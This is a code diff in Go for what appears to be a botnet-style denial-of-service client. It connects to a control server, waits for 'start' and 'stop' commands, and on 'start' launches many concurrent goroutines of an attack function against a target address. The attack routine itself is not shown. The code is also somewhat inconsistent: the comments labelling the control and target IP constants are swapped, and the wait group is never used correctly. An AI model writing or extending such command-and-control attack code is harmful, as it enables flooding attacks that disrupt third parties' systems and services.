@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"fmt"
+	"sync"
 )
 
 var running int
@@ -11,7 +12,7 @@ const TARGET_IP = ""          // control server IP here
 const SERVER_IP = "127.0.0.1" // target IP here
 
 func main() {
-	// var threads sync.WaitGroup
+	var threads sync.WaitGroup
 
 	// server socket details and setup
 	server_addr := SERVER_IP + ":" + "8080"
@@ -32,8 +33,13 @@ func main() {
 		cmd = bytes.Trim(cmd, "\x00")
 		if string(cmd) == "start" {
 			fmt.Println("Executing attack...")
+			running = 1
+			for i := 0; i < NUM_THREADS; i++ {
+				go attack(target)
+			}
 		} else if string(cmd) == "stop" {
 			fmt.Println("Stopping attack...")
+			threads.Wait()
 		}
 	}
 }
